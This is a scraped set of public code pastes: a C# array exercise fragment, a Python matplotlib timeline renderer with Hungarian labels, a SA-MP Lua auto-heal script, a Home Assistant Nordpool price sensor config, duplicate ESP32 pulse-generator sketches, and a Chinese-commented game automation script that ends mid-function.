        int line = 1;
        int column = 0;
        int sum = 0;
        int productOfNumbers = 1;

        int[,] arrya = {
            { 1, 2, 3 },
            { 4, 5, 6 },
            { 7, 8, 9 }
        };

        for (int i = 0; i < arrya.GetLength(1); i++)
        {
            sum += arrya[line, i];
        }

        for (int i = 0;i < arrya.GetLength(0); i++)
        {
            productOfNumbers *= arrya[i, column];
        }

        for(int i = 0; i < arrya.GetLength(0) ; i++)
        {
            for (int j = 0; j < arrya.GetLength(1); j++)
            {
                Console.Write(arrya[i, j] + "" "");
            }
            Console.WriteLine();
        }

        Console.WriteLine($""сумма второй строки - {sum},\nпроизведение первого столбца - {productOfNumbers}."");
    }
}"
53cx7akz,Untitled,GeryGreyhound,Python,Sunday 19th of October 2025 03:48:08 AM CDT,"# timeline_visualizer.py
# Requires: matplotlib, numpy
# Usage: create instance, add people/events, then render()

import math
import datetime
from typing import List, Dict, Any, Tuple, Optional
import matplotlib.pyplot as plt
import matplotlib.colors as mcolors
from matplotlib.patches import FancyBboxPatch, Rectangle
import numpy as np

class TimelineVisualizer:
	""""""
	Simple, reusable visualizer that draws horizontal age-based timelines
	for multiple people (parallel bars). X axis = AGE (not calendar year).
	""""""
	def __init__(self,
		people: List[Dict[str, Any]],
		age_max: int = 100,
		size: Tuple[int, int] = (1920, 1080),
		dpi: int = 100,
		font_family: str = ""DejaVu Sans"",
		pastel_palette: Optional[List[str]] = None):
		""""""
		people: list of dicts, each with keys:
			- 'name': str
			- 'birth_year': int
			- 'events': list of dicts with either:
				Point event: {'year': int, 'label': str, 'color': Optional[str], 'position': Optional[str]}
					position: 'close_to_bar', 'away_from_bar', or 'auto' (default)
				Duration event: {'start_year': int, 'end_year': int, 'label': str}
		age_max: maximum age shown on X axis
		size: (width_px, height_px)
		""""""
		self.people = people
		self.age_max = age_max
		self.size = size
		self.dpi = dpi
		self.font_family = font_family
		# Modern, vibrant social media color palette
		self.pastel_palette = pastel_palette or [""#FF6B6B"", ""#4ECDC4"", ""#45B7D1"", ""#FFA07A""]
		plt.rcParams['font.family'] = self.font_family

	def year_to_age(self, birth_year: int, year: int) -> float:
		return year - birth_year

	def render(self,
		filename: str = ""parallel_timelines.png"",
		show_grid_every: int = 10,
		bar_height: float = 0.6):
		# Figure sizing: Matplotlib expects inches
		fig_w = self.size[0] / self.dpi
		fig_h = self.size[1] / self.dpi
		fig, ax = plt.subplots(figsize=(fig_w, fig_h), dpi=self.dpi)

		# Y positions for parallel bars
		n = len(self.people)
		if n == 0:
			raise ValueError(""No people provided to visualize."")
		ys = np.linspace(n - 1, 0, n)  # top-to-bottom order

		# Draw a modern infographic-style background
		fig.patch.set_facecolor(""#F8F9FA"")
		ax.set_facecolor(""#F8F9FA"")

		# Draw dashed vertical separators (every show_grid_every years)
		for age in range(0, self.age_max + 1, show_grid_every):
			ax.vlines(age, -1, n, linestyles='dashed', linewidth=0.8, alpha=0.3, color='#666666')

		# Draw horizontal bars (life spans) and events
		for i, person in enumerate(self.people):
			y = ys[i]
			name = person.get('name', f""Person {i+1}"")
			birth = int(person['birth_year'])
			
			# Determine max age for this person (special handling for 1985)
			person_age_max = 40 if birth == 1985 else self.age_max

			# draw full-age bar (0 .. age_max) with stroke and rounded corners
			bar_color = self.pastel_palette[i % len(self.pastel_palette)]
			
			# Draw bar with rounded corners
			bar = FancyBboxPatch((0, y - bar_height/2), person_age_max, bar_height,
				boxstyle=""round,pad=0.02"", 
				edgecolor='none',  # We'll draw borders manually
				linewidth=0,
				facecolor=bar_color, 
				alpha=0.85,
				zorder=2)
			ax.add_patch(bar)
			
			# Manually draw borders with precise positioning
			border_width = 2.5
			border_color = '#2C3E50'
			border_offset = border_width / 2000  # Slight inset to align with bar edge
			
			# Special fade effect for 1985
			if birth == 1985:
				# Add gradient fade from bar color to white background
				fade_width = 1.5  # Fade over about 1.5 age units
				num_steps = 30
				background_color = mcolors.to_rgb('#F8F9FA')
				bar_rgb = mcolors.to_rgb(bar_color)
				
				for step in range(num_steps):
					x_start = person_age_max + (step * fade_width / num_steps)
					x_width = fade_width / num_steps
					# Interpolate between bar color and white background
					ratio = step / num_steps
					r = bar_rgb[0] * (1 - ratio) + background_color[0] * ratio
					g = bar_rgb[1] * (1 - ratio) + background_color[1] * ratio
					b = bar_rgb[2] * (1 - ratio) + background_color[2] * ratio
					fade_color = (r, g, b)
					
					fade_rect = Rectangle((x_start, y - bar_height/2), x_width, bar_height,
						facecolor=fade_color, edgecolor='none', alpha=0.85, zorder=2.1)
					ax.add_patch(fade_rect)
				
				# Fading top border
				for step in range(num_steps):
					x_start = person_age_max + (step * fade_width / num_steps)
					x_end = person_age_max + ((step + 1) * fade_width / num_steps)
					ratio = step / num_steps
					alpha_val = 1.0 - ratio
					ax.plot([x_start, x_end], [y + bar_height/2 - border_offset, y + bar_height/2 - border_offset], 
						linewidth=border_width, color=border_color, alpha=alpha_val, 
						solid_capstyle='butt', zorder=3)
				
				# Fading bottom border
				for step in range(num_steps):
					x_start = person_age_max + (step * fade_width / num_steps)
					x_end = person_age_max + ((step + 1) * fade_width / num_steps)
					ratio = step / num_steps
					alpha_val = 1.0 - ratio
					ax.plot([x_start, x_end], [y - bar_height/2 + border_offset, y - bar_height/2 + border_offset], 
						linewidth=border_width, color=border_color, alpha=alpha_val, 
						solid_capstyle='butt', zorder=3)
			
			# Top border (up to person_age_max)
			ax.plot([0, person_age_max], [y + bar_height/2 - border_offset, y + bar_height/2 - border_offset], 
				linewidth=border_width, color=border_color, solid_capstyle='round', zorder=3)
			# Bottom border (up to person_age_max)
			ax.plot([0, person_age_max], [y - bar_height/2 + border_offset, y - bar_height/2 + border_offset], 
				linewidth=border_width, color=border_color, solid_capstyle='round', zorder=3)
			# Left border
			ax.plot([0, 0], [y - bar_height/2 + border_offset, y + bar_height/2 - border_offset], 
				linewidth=border_width, color=border_color, solid_capstyle='round', zorder=3)
			
			# Right border - only for 1885, not for 1985 (ongoing)
			if birth != 1985:
				ax.plot([person_age_max, person_age_max], [y - bar_height/2 + border_offset, y + bar_height/2 - border_offset], 
					linewidth=border_width, color=border_color, solid_capstyle='round', zorder=3)

			# person label positioning: top for 1985 (to avoid dot overlap), bottom for 1885
			if birth == 1985:
				# Upper left corner to avoid overlapping with dots at bottom
				ax.text(1, y + bar_height/2 - 0.05, f""{name}"", 
					ha='left', va='top', fontsize=16, weight='bold', color='white', zorder=3,
					bbox=dict(boxstyle=""round,pad=0.3"", facecolor='#2C3E50', alpha=0.8, edgecolor='none'))
			else:
				# Bottom left corner (default)
				ax.text(1, y - bar_height/2 + 0.05, f""{name}"", 
					ha='left', va='bottom', fontsize=16, weight='bold', color='white', zorder=3,
					bbox=dict(boxstyle=""round,pad=0.3"", facecolor='#2C3E50', alpha=0.8, edgecolor='none'))

			# events: annotate on the bar
			# Divide bar height into thirds for vertical positioning
			bar_third = bar_height / 3
			
			events = person.get('events', [])
			for ev_idx, ev in enumerate(events):
				label = ev.get('label', '')
				
				# Check if this is a duration event (has start_year and end_year)
				is_duration = 'start_year' in ev and 'end_year' in ev
				
				if is_duration:
					# Duration event (e.g., wars, political eras)
					start_year = int(ev['start_year'])
					end_year = int(ev['end_year'])
					start_age = self.year_to_age(birth, start_year)
					end_age = self.year_to_age(birth, end_year)
					
					# skip if completely outside the plotted range
					if end_age < 0 or start_age > person_age_max:
						continue
					
					# Clamp to visible range
					start_age = max(0, start_age)
					end_age = min(person_age_max, end_age)
					mid_age = (start_age + end_age) / 2
					
					# Position closer to vertical center of the chart
					# Move toward the center between the two bars
					if birth == 1885:
						y_duration = y - bar_third * 0.5  # Move down slightly
					else:
						y_duration = y + bar_third * 0.5  # Move up slightly
					
					# Draw horizontal line connecting the markers
					ax.plot([start_age, end_age], [y_duration, y_duration], linewidth=2.5, 
						color='#2C3E50', alpha=0.8, solid_capstyle='butt', zorder=5)
					
					# Draw semi-circle markers at start and end (like split dots)
					# Left semi-circle (start)
					ax.plot(start_age, y_duration, marker='o', markersize=12, 
						markeredgecolor='white', markerfacecolor='#2C3E50', 
						markeredgewidth=2, zorder=6)
					# Right semi-circle (end)
					ax.plot(end_age, y_duration, marker='o', markersize=12, 
						markeredgecolor='white', markerfacecolor='#2C3E50', 
						markeredgewidth=2, zorder=6)
					
					# Label above the line (event name)
					ax.text(mid_age, y_duration + 0.08, label,
						ha='center',
						va='bottom',
						fontsize=12,
						weight='600',
						color='#2C3E50',
						zorder=7)
					
					# Years below the line
					ax.text(mid_age, y_duration - 0.08, f""{start_year}–{end_year}"",
						ha='center',
						va='top',
						fontsize=11,
						weight='500',
						color='#2C3E50',
						zorder=7)
				else:
					# Regular point event
					year = int(ev['year'])
					age = self.year_to_age(birth, year)

					# skip if outside the plotted range
					if age < 0 or age > person_age_max:
						continue

					# Position to the outside: top third for 1885, bottom third for 1985
					if birth == 1885:
						y_point = y + bar_third  # Move towards top
					else:
						y_point = y - bar_third  # Move towards bottom

					# marker with uniform color for clean look
					ax.plot(age, y_point, marker='o', markersize=12, markeredgecolor='white',
						markerfacecolor='#2C3E50', markeredgewidth=2, zorder=5)

					# smart annotation placement: above for 1885 (top), below for 1985 (bottom)
					# Position controlled by ""position"" field: ""close_to_bar"" or ""away_from_bar""
					# Increased offsets for 3-row labels
					position = ev.get('position', 'auto')
					
					if birth == 1885:
						# Labels on top
						base_offset = 0.6  # More space from bar
						extra_offset = 0.4
						
						if position == 'close_to_bar':
							vert_offset = base_offset
						elif position == 'away_from_bar':
							vert_offset = base_offset + extra_offset
						else:
							# Auto: alternate based on index (fallback)
							vert_offset = base_offset + (extra_offset if ev_idx % 2 == 1 else 0)
					else:
						# Labels on bottom (1985)
						base_offset = -0.7
						extra_offset = -0.4
						
						if position == 'close_to_bar':
							vert_offset = base_offset
						elif position == 'away_from_bar':
							vert_offset = base_offset + extra_offset
						else:
							# Auto: alternate based on index (fallback)
							vert_offset = base_offset + (extra_offset if ev_idx % 2 == 1 else 0)
						
					ax.annotate(f""{label}\n{year}\n{age} éves"",
						xy=(age, y_point),
						xytext=(age, y_point + vert_offset),
						ha='center',
						va='center',
						fontsize=13,
						weight='500',
						textcoords='data',
						arrowprops=dict(arrowstyle=""-"", linewidth=1.2, alpha=0.7, color='#2C3E50'),
						bbox=dict(boxstyle=""round,pad=0.4"", fc=""white"", ec=""#2C3E50"", linewidth=1.5, alpha=0.95),
						zorder=6)

		# Labels, limits, aesthetics - adjusted for better label visibility
		ax.set_xlim(-5, self.age_max + 5)
		ax.set_ylim(-2, n + 0.3)  # Extra space at bottom and top for labels
		ax.set_yticks([])  # we use inline labels at left instead
		
		# X-axis ticks for age markers
		ax.set_xticks(range(0, self.age_max + 1, show_grid_every))
		ax.tick_params(axis='x', labelsize=12, colors='#2C3E50')
		ax.set_xlabel(""Életkor (év)"", fontsize=16, weight='bold', color='#2C3E50', labelpad=10)
		ax.set_title(""Néhány meghatározó felfedezés és esemény két, 100 év különbséggel született ember életében"", fontsize=22, weight='bold', pad=20, color='#2C3E50')

		# Tidy up spines
		for spine in ['top', 'right', 'left']:
			ax.spines[spine].set_visible(False)
		ax.spines['bottom'].set_linewidth(1.5)
		ax.spines['bottom'].set_color('#2C3E50')

		plt.tight_layout()
		plt.savefig(filename, dpi=self.dpi, bbox_inches='tight', facecolor=fig.get_facecolor())
		plt.close(fig)
		print(f""Saved timeline to: {filename}"")


if __name__ == ""__main__"":
	# Example usage with the two people you described (corrected ages)
	people = [
		{
			""name"": ""Születési év: 1885"",
			""birth_year"": 1885,
			""events"": [
				{""year"": 1895, ""label"" : ""Némafilm"", ""position"" : ""close_to_bar""},
				{""year"": 1910, ""label"": ""Ford T-modell"", ""color"": ""#6FBF73"", ""position"" : ""close_to_bar""},
				{""year"": 1928, ""label"": ""Penicillin"", ""color"": ""#6FBF73"", ""position"" : ""away_from_bar""},
				{""start_year"": 1914, ""end_year"": 1918, ""label"": ""1. világháború""},
				{""year"": 1925, ""label"": ""Magyar Rádió"", ""color"": ""#F2C57C"", ""position"" : ""close_to_bar""},
				{""start_year"": 1939, ""end_year"": 1945, ""label"": ""2. világháború""},
				{""year"": 1947, ""label"" : ""Tranzisztor"", ""color"": ""#6FBF73"", ""position"" : ""close_to_bar""},
				{""year"": 1957, ""label"": ""Magyar Televízió"", ""color"": ""#A3C4F3"", ""position"" : ""close_to_bar""},
				{""year"": 1964, ""label"": ""Audiokazetta"", ""color"": ""#A3C4F3"", ""position"" : ""away_from_bar""},
				{""year"": 1976, ""label"": ""VHS"", ""color"": ""#6FBF73"", ""position"" : ""close_to_bar""},
				{""year"": 1982, ""label"": ""Commodore 64"", ""color"": ""#A18CD1"", ""position"" : ""away_from_bar""},
			]
		},
		{
			""name"": ""Születési év: 1985"",
			""birth_year"": 1985,
			""events"": [
				{""year"": 1986, ""label"": ""Csernobil"", ""color"": ""#6FBF73"", ""position"" : ""close_to_bar""},
				{""year"": 1993, ""label"": ""Megalakul az EU"", ""color"": ""#6FBF73"", ""position"" : ""away_from_bar""},
				{""year"": 1995, ""label"": ""World Wide Web"", ""color"": ""#6FBF73"", ""position"" : ""close_to_bar""},
				{""year"": 2001, ""label"": ""9/11"", ""color"": ""#E07A5F"", ""position"" : ""away_from_bar""},
				
				{""year"": 2008, ""label"": ""Android 1.0"", ""color"": ""#F2C57C"", ""position"" : ""away_from_bar""},
				{""year"": 2004, ""label"": ""Magyarország EU tag"", ""color"": ""#E07A5F"", ""position"" : ""close_to_bar""},
				{""start_year"": 2010, ""end_year"": 2026, ""label"": ""NER""},
				{""year"": 2016, ""label"": ""Brexit"", ""color"": ""#E07A5F"", ""position"" : ""close_to_bar""},
				{""year"": 2020, ""label"": ""COVID-19"", ""color"": ""#A18CD1"", ""position"" : ""away_from_bar""},
				{""year"": 2023, ""label"": ""ChatGPT"", ""color"": ""#A18CD1"", ""position"" : ""close_to_bar""},
			]
		}
	]

	tv = TimelineVisualizer(people=people, age_max=100, size=(1920, 1080), dpi=120)
	tv.render(""parallel_age_timelines.png"")"
cHZ8Y6iD,Auto Accept Heal by Maku Kenesu,maku_kenesu19,Lua,Sunday 19th of October 2025 03:33:09 AM CDT,"script_name(""Auto Accept Heal"")
script_author(""Maku Kenesu"")

require ""lib.moonloader""
require ""lib.sampfuncs""
local ev = require ""lib.samp.events""

local label = ""{FF8282}[Auto Heal by Maku Kenesu]{FFFFFF} ""

-- CONFIG
local limitPrice = 100       -- Default maximum heal price
local allowedMedic = nil     -- Only accept from this medic (nil = anyone)
local autoHealEnabled = true -- Toggle state

-- MAIN EVENT
function ev.onServerMessage(color, text)
  if not autoHealEnabled then return end

  local medic, amount = text:match(""^%* Medic ([%w_.%s]+) wants to heal you for %$(%d+), type /accept heal to accept%.$"")
  if medic and amount then
    local price = tonumber(amount)

    -- Check price limit
    if limitPrice and price > limitPrice then
      sampAddChatMessage(label .. ""Ignored heal from "" .. medic .. "" ($"" .. price .. "" > limit $"" .. limitPrice .. "")"", 0xFF6666)
      return false
    end

    -- Check medic restriction
    if allowedMedic and medic:lower() ~= allowedMedic:lower() then
      sampAddChatMessage(label .. ""Ignored heal from "" .. medic .. "" (not allowed medic)."", 0xFF6666)
      return false
    end

    -- Accept heal
    lua_thread.create(function()
      wait(500)
      sampSendChat(""/accept heal"")
      sampAddChatMessage(label .. ""Accepted heal from "" .. medic .. "" ($"" .. amount .. "")"", 0x33CCFF)
    end)
    return false
  end
end

-- COMMANDS
function cmd_limitPrice(param)
  local value = tonumber(param)
  if not value then
    sampAddChatMessage(label .. ""Usage: /ah.limitprice [amount]"", 0xFFFFFF)
    return
  end
  limitPrice = value
  sampAddChatMessage(label .. ""Maximum heal price set to $"" .. limitPrice, 0x33CCFF)
end

function cmd_from(param)
  if not param or param == """" or param:lower() == ""none"" then
    allowedMedic = nil
    sampAddChatMessage(label .. ""No longer restricting to any medic."", 0x33CCFF)
    return
  end
  allowedMedic = param
  sampAddChatMessage(label .. ""Now only accepting heals from: "" .. allowedMedic, 0x33CCFF)
end

function cmd_toggle()
  autoHealEnabled = not autoHealEnabled
  local state = autoHealEnabled and ""{00FF00}enabled"" or ""{FF0000}disabled""
  sampAddChatMessage(label .. ""Auto-heal has been "" .. state .. ""{FFFFFF}."", 0x33CCFF)
end

function cmd_help()
  sampAddChatMessage(""{33CCFF}=== Auto Heal Commands ==="", 0xFFFFFF)
  sampAddChatMessage(""{FFFFFF}/ah.toggle - Enable or disable auto-accepting heals"", 0xFFFFFF)
  sampAddChatMessage(""{FFFFFF}/ah.limitprice [amount] - Set max heal price (current: $"" .. limitPrice .. "")"", 0xFFFFFF)
  local medicName = allowedMedic and allowedMedic or ""None""
  sampAddChatMessage(""{FFFFFF}/ah.from [name|none] - Restrict heals to specific medic (current: "" .. medicName .. "")"", 0xFFFFFF)
  sampAddChatMessage(""{FFFFFF}/ah.help - Show this help message"", 0xFFFFFF)
end

-- MAIN
function main()
  while not isSampAvailable() do
    wait(100)
  end

  sampAddChatMessage(label .. ""Loaded and active. (/ah.help)"", 0x33CCFF)

  sampRegisterChatCommand(""ah.limitprice"", cmd_limitPrice)
  sampRegisterChatCommand(""ah.from"", cmd_from)
  sampRegisterChatCommand(""ah.toggle"", cmd_toggle)
  sampRegisterChatCommand(""ah.help"", cmd_help)
end
"
3z7zDDPq,Python Assignment 6 solution (IITM web MTech AI  2025),sohangchopra,Python,Sunday 19th of October 2025 03:30:35 AM CDT,"
def find_deepest_string_in_list(nested_list: list) -> str:
    # breadth first search
    while True:
        curr = []
        strings = []
        for x in nested_list:
            if isinstance(x, str):
                strings.append(x)
            elif isinstance(x, list):
                curr.extend(x)
        if not curr:
            return strings[0] if strings else None
        nested_list = curr
    "
mQENSHB7,Vip Gunung Meledak,yocky12k,JSON,Sunday 19th of October 2025 03:25:57 AM CDT,"{
  ""users"": [
    {
      ""hwid"": ""597dde88-52fc-4c91-8ab5-48e1d5509a3b"",
      ""name"": ""Yocky"",
      ""expiry"": ""2025-10-20""
    }
  ]
}
"
052vsR3T,Untitled,edam2021,YAML,Sunday 19th of October 2025 03:14:32 AM CDT,"- trigger:
  - platform: time_pattern
    minutes: ""/15""
  - platform: state
    entity_id: sensor.nordpool_kwh_fi_eur
    attribute: raw_today
  - platform: state
    entity_id: sensor.nordpool_kwh_fi_eur
    attribute: raw_tomorrow
  - platform: homeassistant
    event: start
  sensor:
  - name: ""nordpool_today_cheapest_slots""
    unique_id: nordpool_today_cheapest_slots
    state: >
      {% set data = state_attr('sensor.nordpool_kwh_fi_eur', 'raw_today') %}
      {% if data %}
        {% set sorted = data | sort(attribute='value') %}
        {% set cheapest = sorted[:8] %}
        {{ cheapest | map(attribute='start') | map('as_timestamp') | list }}
      {% else %}
        unknown
      {% endif %}

  - name: ""nordpool_today_expensive_slots""
    unique_id: nordpool_today_expensive_slots
    state: >
      {% set data = state_attr('sensor.nordpool_kwh_fi_eur', 'raw_today') or [] %}
      {% if data | count > 0 %}
        {% set sorted = data | sort(attribute='value', reverse=true) %}
        {% set expensive = sorted[:8] %}
        {{ expensive | map(attribute='start') | map('as_timestamp') | list }}
      {% else %}
        unknown
      {% endif %}

  - name: ""nordpool_tomorrow_cheapest_slots""
    unique_id: nordpool_tomorrow_cheapest_slots
    state: >
      {% set data = state_attr('sensor.nordpool_kwh_fi_eur', 'raw_tomorrow') %}
      {% if data %}
        {% set sorted = data | sort(attribute='value') %}
        {% set cheapest = sorted[:8] %}
        {{ cheapest | map(attribute='start') | map('as_timestamp') | list }}
      {% else %}
        []
      {% endif %}

  - name: ""nordpool_tomorrow_expensive_slots""
    unique_id: nordpool_tomorrow_expensive_slots
    state: >
      {% set data = state_attr('sensor.nordpool_kwh_fi_eur', 'raw_tomorrow') or [] %}
      {% if data | count > 0 %}
        {% set sorted = data | sort(attribute='value', reverse=true) %}
        {% set expensive = sorted[:8] %}
        {{ expensive | map(attribute='start') | map('as_timestamp') | list }}
      {% else %}
        []
      {% endif %}

  - name: ""nordpool_today_average_price""
    state: ""{{ state_attr('sensor.nordpool_kwh_fi_eur', 'average') | float }}""
"
hFw6uqu4,Simultaneous Pulses rev_02,pleasedontcode,Arduino,Sunday 19th of October 2025 03:08:10 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Simultaneous Pulses
	- Source Code compiled for: ESP32 DevKit V1
	- Source Code created on: 2025-10-19 08:07:02

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* provide five pulse outputs simultaneously of one */
	/* millisecond  at individual frequencies . The */
	/* frequencies required are as follows : 10 Hz , 25 */
	/* Hz , 50 Hz , 75 Hz , 100 Hz . */
/****** END SYSTEM REQUIREMENTS *****/




/* START CODE */

/****** DEFINITION OF LIBRARIES *****/

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

// ESP32 Five-Channel Pulse Generator
// Generates five simultaneous 1 ms pulses at frequencies:
// 10 Hz, 25 Hz, 50 Hz, 75 Hz, 100 Hz on five separate GPIO pins.

// Pin assignments for ESP32 DevKit V1 (adjust if needed):
const uint8_t PULSE_PINS[5] = {16, 17, 18, 19, 21};

// Target frequencies in Hz
const uint32_t PULSE_FREQS[5] = {10, 25, 50, 75, 100};

// Internal channel representation
typedef struct {
    uint8_t pin;          // GPIO pin for the channel
    uint64_t period_us;     // Pulse period in microseconds
    uint64_t next_time;     // Next scheduled pulse start time (microseconds)
    bool in_pulse;          // Is the 1 ms pulse currently high?
    uint64_t pulse_end;     // Time when current 1 ms pulse ends
} PulseChannel;

PulseChannel channels[5];

void setup(void)
{
    // Initialize serial for debugging (optional)
    // Serial.begin(115200);

    // Configure pins as outputs and reset state
    for (int i = 0; i < 5; i++) {
        pinMode(PULSE_PINS[i], OUTPUT);
        digitalWrite(PULSE_PINS[i], LOW);
    }

    // Initialize channel parameters
    uint64_t now = (uint64_t)micros();
    for (int i = 0; i < 5; i++) {
        channels[i].pin = PULSE_PINS[i];
        // Use integer division for period; fractional remainder ignored per cycle
        channels[i].period_us = (uint64_t)(1000000ull / PULSE_FREQS[i]);
        channels[i].next_time = now;  // start pulses immediately
        channels[i].in_pulse = false;
        channels[i].pulse_end = 0;
    }
}

void loop(void)
{
    uint64_t now = (uint64_t)micros();

    for (int i = 0; i < 5; i++) {
        // If not currently pulsing and it's time for the next pulse, start a 1 ms pulse
        if (!channels[i].in_pulse && now >= channels[i].next_time) {
            digitalWrite(channels[i].pin, HIGH);
            channels[i].in_pulse = true;
            channels[i].pulse_end = now + 1000ull; // 1 ms pulse width
        }
        // If currently pulsing and the 1 ms width has elapsed, end pulse and schedule next
        else if (channels[i].in_pulse && now >= channels[i].pulse_end) {
            digitalWrite(channels[i].pin, LOW);
            channels[i].in_pulse = false;
            // Schedule next pulse start time based on period
            channels[i].next_time += channels[i].period_us;
            // If we somehow fell behind, realign to now
            if (channels[i].next_time < now) {
                channels[i].next_time = now + channels[i].period_us;
            }
        }
    }

    // Small delay to prevent excessive CPU usage; keeps loop responsive
    delayMicroseconds(50);
}

/* END CODE */
"
3eCYYFcW,ESP32 Pulses rev_01,pleasedontcode,Arduino,Sunday 19th of October 2025 03:04:33 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: ESP32 Pulses
	- Source Code NOT compiled for: ESP32 DevKit V1
	- Source Code created on: 2025-10-19 08:03:11

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* provide five pulse outputs simultaneously of one */
	/* millisecond  at individual frequencies . The */
	/* frequencies required are as follows : 10 Hz , 25 */
	/* Hz , 50 Hz , 75 Hz , 100 Hz . */
/****** END SYSTEM REQUIREMENTS *****/


/* START CODE */

/****** DEFINITION OF LIBRARIES *****/

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

// ESP32 Five-Channel Pulse Generator
// Generates five simultaneous 1 ms pulses at frequencies:
// 10 Hz, 25 Hz, 50 Hz, 75 Hz, 100 Hz on five separate GPIO pins.

// Pin assignments for ESP32 DevKit V1 (adjust if needed):
const uint8_t PULSE_PINS[5] = {16, 17, 18, 19, 21};

// Target frequencies in Hz
const uint32_t PULSE_FREQS[5] = {10, 25, 50, 75, 100};

// Internal channel representation
typedef struct {
    uint8_t pin;          // GPIO pin for the channel
    uint64_t period_us;     // Pulse period in microseconds
    uint64_t next_time;     // Next scheduled pulse start time (microseconds)
    bool in_pulse;          // Is the 1 ms pulse currently high?
    uint64_t pulse_end;     // Time when current 1 ms pulse ends
} PulseChannel;

PulseChannel channels[5];

void setup(void)
{
    // Initialize serial for debugging (optional)
    // Serial.begin(115200);

    // Configure pins as outputs and reset state
    for (int i = 0; i < 5; i++) {
        pinMode(PULSE_PINS[i], OUTPUT);
        digitalWrite(PULSE_PINS[i], LOW);
    }

    // Initialize channel parameters
    uint64_t now = (uint64_t)micros();
    for (int i = 0; i < 5; i++) {
        channels[i].pin = PULSE_PINS[i];
        // Use integer division for period; fractional remainder ignored per cycle
        channels[i].period_us = (uint64_t)(1000000ull / PULSE_FREQS[i]);
        channels[i].next_time = now;  // start pulses immediately
        channels[i].in_pulse = false;
        channels[i].pulse_end = 0;
    }
}

void loop(void)
{
    uint64_t now = (uint64_t)micros();

    for (int i = 0; i < 5; i++) {
        // If not currently pulsing and it's time for the next pulse, start a 1 ms pulse
        if (!channels[i].in_pulse && now >= channels[i].next_time) {
            digitalWrite(channels[i].pin, HIGH);
            channels[i].in_pulse = true;
            channels[i].pulse_end = now + 1000ull; // 1 ms pulse width
        }
        // If currently pulsing and the 1 ms width has elapsed, end pulse and schedule next
        else if (channels[i].in_pulse && now >= channels[i].pulse_end) {
            digitalWrite(channels[i].pin, LOW);
            channels[i].in_pulse = false;
            // Schedule next pulse start time based on period
            channels[i].next_time += channels[i].period_us;
            // If we somehow fell behind, realign to now
            if (channels[i].next_time < now) {
                channels[i].next_time = now + channels[i].period_us;
            }
        }
    }

    // Small delay to prevent excessive CPU usage; keeps loop responsive
    delayMicroseconds(50);
}

/* END CODE */
"
uXY9mv2i,dinosaur_farmer.py,Urara_Chiya,Python,Sunday 19th of October 2025 02:02:50 AM CDT,"# ==============================================================================
# 恐龙模式 (贪吃蛇) 自动化脚本 (dinosaur_farmer_v4.py)
#
# 版本 4: 移除了所有 """"""..."""""" 形式的文档字符串。
#
# 策略:
# 1. 保证在调用 measure() 时，无人机正位于一个苹果上。
# 2. 采用动态寻路：每移动一步都重新计算到目标的最优路径，以应对
#    自身尾巴（移动障碍物）的变化。
# 3. 自动完成整个游戏、收获、重玩的循环。
#
# 严格遵守所有编程限制。
# ==============================================================================

from utils import *

# ------------------------------------------------------------------------------
# 配置与常量
# ------------------------------------------------------------------------------
START_X = 0
START_Y = 0

DIRECTION_VECTORS = {
    North: (0, 1),
    East: (1, 0),
    South: (0, -1),
    West: (-1, 0)
}
OPPOSITE_DIRECTIONS = {
    North: South,
    South: North,
    East: West,
    West: East
}

# ------------------------------------------------------------------------------
# 辅助函数
# ------------------------------------------------------------------------------

def manhattan_distance(x1, y1, x2, y2):
    return abs(x1 - x2) + abs(y1 - y2)

# 准备开始一轮恐龙游戏，结束时无人机应位于第一个苹果上。
def setup_game():
    quick_print(""正在准备新一轮的恐龙游戏..."")
    clear()
    move_to(START_X, START_Y)
    
    # 假设每次生成苹果需要1个仙人掌
    if num_items(Items.Cactus) < get_world_size() * get_world_size():
        quick_print(""警告: 仙人掌数量可能不足以填满整个地图。"")

    # 装备帽子，这会在无人机下方生成第一个苹果
    quick_print(""装备恐龙帽..."")
    change_hat(Hats.Dinosaur_Hat)
    
    # 检查苹果是否成功生成
    if get_entity_type() != Entities.Apple:
        quick_print(""错误：装备帽子后未生成苹果。"")
        return False
        
    return True

# ------------------------------------------------------------------------------
# 核心寻路算法
# ------------------------------------------------------------------------------

# 全局变量，用于在递归调用中共享状态
path_solution = []
visited_grid = []
apple_x = 0
apple_y = 0

def find_path_recursive(current_x, current_y):
    global path_solution
    global visited_grid
    global apple_x
    global apple_y

    if current_x == apple_x and current_y == apple_y:
        return True

    visited_grid[current_y][current_x] = True
    
    possible_moves = []
    directions_to_check = [North, East, South, West]
    for direction in directions_to_check:
        dx, dy = DIRECTION_VECTORS[direction]
        next_x, next_y = current_x + dx, current_y + dy
        
        world_size = get_world_size()
        if 0 <= next_x < world_size and 0 <= next_y < world_size:
            if not visited_grid[next_y][next_x]:
                dist = manhattan_distance(next_x, next_y, apple_x, apple_y)
                possible_moves.append([dist, direction])

    n = len(possible_moves)
    for i in range(n):
        for j in range(0, n - i - 1):
            if possible_moves[j][0] > possible_moves[j+1][0]:
                temp = possible_moves[j]
                possible_moves[j] = possible_moves[j+1]
                possible_moves[j+1] = temp

    for move_info in possible_moves:
        direction = move_info[1]
        
        path_solution.append(direction)
        dx, dy = DIRECTION_VECTORS[direction]
        
        if find_path_recursive(current_x + dx, current_y + dy):
            return True
            
        path_solution.pop()
            
    return False

def find_path_to_apple(start_x, start_y, target_x, target_y, snake_body):
    global path_solution
    global visited_grid
    global apple_x
    global apple_y
    
    apple_x = target_x
    apple_y = target_y
    path_solution = []
    
    world_size = get_world_size()

    visited_grid = []
